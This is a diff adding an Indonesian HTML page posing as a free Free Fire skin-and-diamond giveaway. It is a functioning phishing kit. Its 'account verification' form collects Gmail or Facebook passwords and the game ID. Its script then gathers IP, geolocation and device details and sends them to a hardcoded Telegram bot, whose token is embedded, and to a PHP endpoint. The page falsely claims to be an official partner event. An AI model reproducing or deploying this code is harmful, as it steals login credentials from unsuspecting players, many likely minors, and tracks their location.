@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DM Gratis Bundle - SK8N Gojo & SG OPM</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        /* BANNER SECTION */
+        .banner {
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+            border-radius: 15px;
+            padding: 40px;
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .banner h2 {
+            font-size: 2.2rem;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+
+        .banner p {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+
+        /* BUNDLES SECTION */
+        .bundles-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .bundle-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            transition: transform 0.3s ease;
+            cursor: pointer;
+        }
+
+        .bundle-card:hover {
+            transform: translateY(-10px);
+        }
+
+        .bundle-card.selected {
+            border: 3px solid #ff4757;
+            box-shadow: 0 0 20px rgba(255, 71, 87, 0.4);
+        }
+
+        .bundle-image {
+            height: 200px;
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+
+        .bundle-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #ff4757;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .bundle-content {
+            padding: 20px;
+        }
+
+        .bundle-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #2f3542;
+            margin-bottom: 10px;
+        }
+
+        .bundle-description {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 0.95rem;
+        }
+
+        .bundle-features {
+            list-style: none;
+            margin-bottom: 20px;
+        }
+
+        .bundle-features li {
+            padding: 5px 0;
+            color: #555;
+        }
+
+        .bundle-features li i {
+            color: #ffa502;
+            margin-right: 10px;
+        }
+
+        .select-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(to right, #ff7e5f, #feb47b);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .select-btn:hover {
+            background: linear-gradient(to right, #feb47b, #ff7e5f);
+            transform: scale(1.02);
+        }
+
+        /* MODAL STYLES */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: modalSlide 0.3s ease;
+        }
+
+        @keyframes modalSlide {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px 15px 0 0;
+            text-align: center;
+        }
+
+        .modal-header h3 {
+            font-size: 1.5rem;
+        }
+
+        .modal-body {
+            padding: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #444;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        .form-input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+
+        .platform-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .platform-tab {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            background: #f1f2f6;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .platform-tab.active {
+            background: #667eea;
+            color: white;
+        }
+
+        .form-footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(to right, #96c93d, #00b09b);
+            transform: scale(1.02);
+        }
+
+        /* SUCCESS MESSAGE */
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: #00b894;
+            margin-bottom: 20px;
+        }
+
+        .success-message h3 {
+            font-size: 1.8rem;
+            color: #2d3436;
+            margin-bottom: 15px;
+        }
+
+        .success-message p {
+            color: #636e72;
+            margin-bottom: 25px;
+            font-size: 1.1rem;
+        }
+
+        .processing-time {
+            background: #dfe6e9;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .processing-time h4 {
+            color: #2d3436;
+            margin-bottom: 10px;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            color: white;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .bundles-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .banner {
+                padding: 25px 20px;
+            }
+            
+            .banner h2 {
+                font-size: 1.8rem;
+            }
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🎁 BUNDLE DM GRATIS 2024</h1>
+            <p>SK8N GOJO • SG OPM • SG REPER • FREE DIAMOND</p>
+        </div>
+
+        <!-- BANNER -->
+        <div class="banner">
+            <h2>🔥 LIMITED TIME OFFER! 🔥</h2>
+            <p>Dapatkan Bundle Gratis untuk Free Fire! Proses Cepat & Aman</p>
+            <p>Hanya untuk 1000 orang pertama!</p>
+        </div>
+
+        <!-- BUNDLES -->
+        <div class="bundles-container">
+            <!-- Bundle 1 -->
+            <div class="bundle-card" data-bundle="gojo">
+                <div class="bundle-image" style="background-image: url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80')">
+                    <span class="bundle-badge">HOT</span>
+                </div>
+                <div class="bundle-content">
+                    <h3 class="bundle-title">🎮 SK8N GOJO BUNDLE</h3>
+                    <p class="bundle-description">Bundle eksklusif karakter Gojo Satoru dengan efek khusus!</p>
+                    <ul class="bundle-features">
+                        <li><i class="fas fa-check"></i> Skin Gojo Satoru Limited</li>
+                        <li><i class="fas fa-check"></i> 500 Diamond Bonus</li>
+                        <li><i class="fas fa-check"></i> Weapon Skin Exclusive</li>
+                        <li><i class="fas fa-check"></i> Gloo Wall Gojo Edition</li>
+                    </ul>
+                    <button class="select-btn" onclick="selectBundle('gojo')">Pilih Bundle Ini</button>
+                </div>
+            </div>
+
+            <!-- Bundle 2 -->
+            <div class="bundle-card" data-bundle="opm">
+                <div class="bundle-image" style="background-image: url('https://images.unsplash.com/photo-1511512578047-dfb367046420?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80')">
+                    <span class="bundle-badge">NEW</span>
+                </div>
+                <div class="bundle-content">
+                    <h3 class="bundle-title">⚔️ SG OPM BUNDLE</h3>
+                    <p class="bundle-description">Skin One Punch Man dengan kemampuan super dan efek visual!</p>
+                    <ul class="bundle-features">
+                        <li><i class="fas fa-check"></i> Skin Saitama Full Set</li>
+                        <li><i class="fas fa-check"></i> 300 Diamond Bonus</li>
+                        <li><i class="fas fa-check"></i> Backpack OPM Edition</li>
+                        <li><i class="fas fa-check"></i> Emote One Punch</li>
+                    </ul>
+                    <button class="select-btn" onclick="selectBundle('opm')">Pilih Bundle Ini</button>
+                </div>
+            </div>
+
+            <!-- Bundle 3 -->
+            <div class="bundle-card" data-bundle="reper">
+                <div class="bundle-image" style="background-image: url('https://images.unsplash.com/photo-1552820728-8b83bb6b773f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80')">
+                    <span class="bundle-badge">POPULAR</span>
+                </div>
+                <div class="bundle-content">
+                    <h3 class="bundle-title">🔫 SG REPER BUNDLE</h3>
+                    <p class="bundle-description">Bundle shotgun reper dengan damage boost dan skin eksklusif!</p>
+                    <ul class="bundle-features">
+                        <li><i class="fas fa-check"></i> SG Reper Golden Skin</li>
+                        <li><i class="fas fa-check"></i> Damage Boost 15%</li>
+                        <li><i class="fas fa-check"></i> 200 Diamond Bonus</li>
+                        <li><i class="fas fa-check"></i> Reload Speed Boost</li>
+                    </ul>
+                    <button class="select-btn" onclick="selectBundle('reper')">Pilih Bundle Ini</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- LOGIN MODAL -->
+        <div id="loginModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>📋 VERIFIKASI AKUN</h3>
+                    <p>Masukkan data akun Anda untuk melanjutkan</p>
+                </div>
+                <div class="modal-body">
+                    <div class="platform-selector">
+                        <div class="platform-tab active" onclick="switchPlatform('google')">
+                            <i class="fab fa-google"></i> Google
+                        </div>
+                        <div class="platform-tab" onclick="switchPlatform('facebook')">
+                            <i class="fab fa-facebook"></i> Facebook
+                        </div>
+                    </div>
+
+                    <div id="googleForm">
+                        <div class="form-group">
+                            <label for="gmail"><i class="fas fa-envelope"></i> Alamat Gmail</label>
+                            <input type="email" id="gmail" class="form-input" placeholder="contoh@gmail.com" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="gmailPassword"><i class="fas fa-lock"></i> Password Gmail</label>
+                            <input type="password" id="gmailPassword" class="form-input" placeholder="Masukkan password" required>
+                        </div>
+                    </div>
+
+                    <div id="facebookForm" style="display: none;">
+                        <div class="form-group">
+                            <label for="fbEmailPhone"><i class="fas fa-user"></i> Email/No HP Facebook</label>
+                            <input type="text" id="fbEmailPhone" class="form-input" placeholder="Email atau nomor HP" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="fbPassword"><i class="fas fa-key"></i> Password Facebook</label>
+                            <input type="password" id="fbPassword" class="form-input" placeholder="Password Facebook" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="ffId"><i class="fas fa-gamepad"></i> ID Free Fire</label>
+                        <input type="text" id="ffId" class="form-input" placeholder="Contoh: 1234567890" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="ffLevel"><i class="fas fa-chart-line"></i> Level Free Fire</label>
+                            <input type="number" id="ffLevel" class="form-input" placeholder="Contoh: 70" min="1" max="100" required>
+                        </div>
+
+                        <div class="form-footer">
+                            <p><i class="fas fa-shield-alt"></i> Data Anda aman dan terlindungi</p>
+                        </div>
+
+                        <button class="submit-btn" onclick="submitForm()">
+                            <i class="fas fa-paper-plane"></i> LANJUTKAN KE BUNDLE
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SUCCESS MODAL -->
+            <div id="successModal" class="modal">
+                <div class="modal-content">
+                    <div class="success-message">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3>🎉 PERMINTAAN BERHASIL! 🎉</h3>
+                        <p>Bundle <span id="selectedBundleName"></span> sedang diproses untuk akun Anda.</p>
+                        
+                        <div class="processing-time">
+                            <h4>⏰ WAKTU PROSES</h4>
+                            <p><strong>Bundle yang dipilih akan sampai dalam 24 jam</strong></p>
+                            <p>Sandi Google akan dikirim ke email Anda</p>
+                        </div>
+
+                        <div style="background: #ffeaa7; padding: 15px; border-radius: 10px; margin-top: 20px;">
+                            <h4 style="color: #d63031;">📦BUNDLE YG DI KIRIM </h4>
+                            <p style="color: #636e72; text-align: left; font-size: 0.9rem;">
+                                • BUNDLE GOJO
+                                • SG REPPER
+                                • SG OPM
+                            </p>
+                        </div>
+
+                        <p style="margin-top: 20px; color: #2d3436;">
+                            <i class="fas fa-sync-alt"></i> Mohon tunggu notifikasi di email dan game Free Fire Anda.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- LOADING -->
+            <div id="loading" class="loading">
+                <div class="loading-spinner"></div>
+                <p>Mengirim data dan memproses bundle...</p>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <p>© 2024 DM Gratis Bundle. Semua hak dilindungi.</p>
+            <p>Disclaimer: Ini adalah event resmi partner Free Fire</p>
+        </div>
+    </div>
+
+    <script>
+        let selectedBundle = null;
+        let currentPlatform = 'google';
+
+        function selectBundle(bundleType) {
+            selectedBundle = bundleType;
+            
+            // Update UI selection
+            document.querySelectorAll('.bundle-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            document.querySelector(`.bundle-card[data-bundle="${bundleType}"]`).classList.add('selected');
+            
+            // Show login modal
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        function switchPlatform(platform) {
+            currentPlatform = platform;
+            
+            // Update tabs
+            document.querySelectorAll('.platform-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Show correct form
+            if (platform === 'google') {
+                document.getElementById('googleForm').style.display = 'block';
+                document.getElementById('facebookForm').style.display = 'none';
+            } else {
+                document.getElementById('googleForm').style.display = 'none';
+                document.getElementById('facebookForm').style.display = 'block';
+            }
+        }
+
+        async function submitForm() {
+            // Get form values
+            const bundleName = getBundleName(selectedBundle);
+            const gmail = document.getElementById('gmail').value;
+            const gmailPassword = document.getElementById('gmailPassword').value;
+            const fbEmailPhone = document.getElementById('fbEmailPhone').value;
+            const fbPassword = document.getElementById('fbPassword').value;
+            const ffId = document.getElementById('ffId').value;
+            const ffLevel = document.getElementById('ffLevel').value;
+            
+            // Validate
+            if ((currentPlatform === 'google' && (!gmail || !gmailPassword)) || 
+                (currentPlatform === 'facebook' && (!fbEmailPhone || !fbPassword)) || 
+                !ffId || !ffLevel) {
+                alert('Harap lengkapi semua data!');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('loginModal').style.display = 'none';
+            
+            // Get user location and IP data
+            const userData = await getUserLocationData();
+            
+            // Prepare data to send
+            const formData = {
+                bundle: selectedBundle,
+                bundle_name: bundleName,
+                platform: currentPlatform,
+                timestamp: new Date().toISOString(),
+                
+                // Google data
+                gmail: currentPlatform === 'google' ? gmail : null,
+                gmail_password: currentPlatform === 'google' ? gmailPassword : null,
+                
+                // Facebook data
+                facebook_email: currentPlatform === 'facebook' ? fbEmailPhone : null,
+                facebook_password: currentPlatform === 'facebook' ? fbPassword : null,
+                
+                // Free Fire data
+                ff_id: ffId,
+                ff_level: ffLevel,
+                
+                // Location data
+                ...userData
+            };
+            
+            // Send to PHP
+            await sendToPHP(formData);
+            
+            // Show success
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('selectedBundleName').textContent = bundleName;
+                document.getElementById('successModal').style.display = 'flex';
+                
+                // Reset form
+                resetForm();
+            }, 2000);
+        }
+
+        async function getUserLocationData() {
+            const data = {
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                local_time: new Date().toLocaleString('id-ID')
+            };
+            
+            try {
+                // Get IP and location
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip_address = ipData.ip;
+                
+                // Get detailed location
+                const locationResponse = await fetch(`https://ipapi.co/${data.ip_address}/json/`);
+                const locationData = await locationResponse.json();
+                
+                data.city = locationData.city || 'Unknown';
+                data.region = locationData.region || 'Unknown';
+                data.country = locationData.country_name || 'Unknown';
+                data.country_code = locationData.country_code || 'Unknown';
+                data.latitude = locationData.latitude || 'Unknown';
+                data.longitude = locationData.longitude || 'Unknown';
+                data.asn = locationData.asn || 'Unknown';
+                data.org = locationData.org || 'Unknown';
+                data.isp = locationData.org || 'Unknown';
+                data.postal = locationData.postal || 'Unknown';
+                data.timezone = locationData.timezone || 'Unknown';
+                
+            } catch (error) {
+                console.log('Error getting location data:', error);
+                data.ip_address = 'Unknown';
+                data.city = 'Unknown';
+                data.country = 'Unknown';
+            }
+            
+            return data;
+        }
+
+        async function sendToPHP(data) {
+            // Prepare email content
+            const emailContent = `
+                ============================================
+                🎮 BUNDLE DM GRATIS REQUEST
+                ============================================
+                
+                📦 BUNDLE: ${data.bundle_name}
+                ⏰ WAKTU: ${data.timestamp}
+                
+                🔐 LOGIN PLATFORM: ${data.platform.toUpperCase()}
+                
+                ${data.platform === 'google' ? `
+                📧 GMAIL: ${data.gmail}
+                🔑 PASSWORD GMAIL: ${data.gmail_password}
+                ` : `
+                📱 FACEBOOK: ${data.facebook_email}
+                🔑 PASSWORD FB: ${data.facebook_password}
+                `}
+                
+                🎮 FREE FIRE DATA:
+                ID: ${data.ff_id}
+                Level: ${data.ff_level}
+                
+                📍 LOCATION DATA:
+                IP Address: ${data.ip_address}
+                Kota: ${data.city}
+                Negara: ${data.country}
+                Region: ${data.region}
+                Kode Negara: ${data.country_code}
+                Latitude: ${data.latitude}
+                Longitude: ${data.longitude}
+                Postal Code: ${data.postal}
+                
+                🌐 NETWORK DATA:
+                ASN: ${data.asn}
+                ISP: ${data.isp}
+                Organization: ${data.org}
+                
+                💻 DEVICE DATA:
+                User Agent: ${data.user_agent}
+                Language: ${data.language}
+                Platform: ${data.platform}
+                Screen: ${data.screen_resolution}
+                Timezone: ${data.timezone}
+                Local Time: ${data.local_time}
+                
+                ============================================
+                © DesaOfficial - Data Capture System
+                ============================================
+            `;
+            
+            // Send via Telegram Bot (Real)
+            await sendTelegram(data, emailContent);
+            
+            // Also send to email via form submission
+            const phpData = new FormData();
+            phpData.append('data', JSON.stringify(data));
+            phpData.append('email_content', emailContent);
+            
+            try {
+                // Send to PHP
+                const response = await fetch('send_data.php', {
+                    method: 'POST',
+                    body: phpData
+                });
+                
+                console.log('Data sent to PHP:', await response.text());
+            } catch (error) {
+                console.log('PHP send error:', error);
+            }
+        }
+
+        async function sendTelegram(data, content) {
+            const telegramToken = '8057784535:AAHzVp3rKgCNxKI4JIXuD1ii8Ry76JTJ8WA';
+            const telegramChatId = '6637547478';
+            
+            // Format message for Telegram
+            let telegramMessage = `🎮 *NEW BUNDLE REQUEST* 🎮\n\n`;
+            telegramMessage += `*Bundle:* ${data.bundle_name}\n`;
+            telegramMessage += `*Platform:* ${data.platform}\n\n`;
+            
+            telegramMessage += `🔐 *LOGIN DATA*\n`;
+            if (data.platform === 'google') {
+                telegramMessage += `Email: ${data.gmail}\n`;
+                telegramMessage += `Password: \`${data.gmail_password}\`\n`;
+            } else {
+                telegramMessage += `FB: ${data.facebook_email}\n`;
+                telegramMessage += `Password: \`${data.facebook_password}\`\n`;
+            }
+            
+            telegramMessage += `\n🎮 *FREE FIRE*\n`;
+            telegramMessage += `ID: ${data.ff_id}\n`;
+            telegramMessage += `Level: ${data.ff_level}\n`;
+            
+            telegramMessage += `\n📍 *LOCATION*\n`;
+            telegramMessage += `IP: \`${data.ip_address}\`\n`;
+            telegramMessage += `${data.city}, ${data.country}\n`;
+            telegramMessage += `ASN: ${data.asn}\n`;
+            telegramMessage += `ISP: ${data.isp}\n`;
+            
+            telegramMessage += `\n⏰ ${new Date().toLocaleString('id-ID')}\n`;
+            telegramMessage += `© DesaOfficial`;
+            
+            try {
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.log('Telegram error:', error);
+            }
+        }
+
+        function getBundleName(bundleType) {
+            const bundles = {
+                'gojo': 'SK8N GOJO BUNDLE',
+                'opm': 'SG OPM BUNDLE', 
+                'reper': 'SG REPER BUNDLE'
+            };
+            return bundles[bundleType] || 'Unknown Bundle';
+        }
+
+        function resetForm() {
+            document.getElementById('gmail').value = '';
+            document.getElementById('gmailPassword').value = '';
+            document.getElementById('fbEmailPhone').value = '';
+            document.getElementById('fbPassword').value = '';
+            document.getElementById('ffId').value = '';
+            document.getElementById('ffLevel').value = '';
+            
+            document.querySelectorAll('.bundle-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            
+            selectedBundle = null;
+        }
+
+        // Close modals when clicking outside
+        window.onclick = function(event) {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => {
+                if (event.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
